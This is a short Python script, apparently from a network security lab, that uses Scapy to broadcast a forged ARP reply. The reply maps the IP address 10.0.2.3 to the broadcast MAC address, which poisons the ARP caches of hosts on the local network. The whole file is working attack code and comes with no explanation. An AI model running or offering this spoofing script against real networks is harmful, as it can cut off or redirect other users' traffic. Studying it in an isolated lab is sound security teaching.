from scapy.all import *

E = Ether(dst='ff:ff:ff:ff:ff:ff')
A = ARP(psrc='10.0.2.3', hwsrc='ff:ff:ff:ff:ff:ff', pdst='10.0.2.3', op=2)
F = E/A
sendp(F, count = 1)

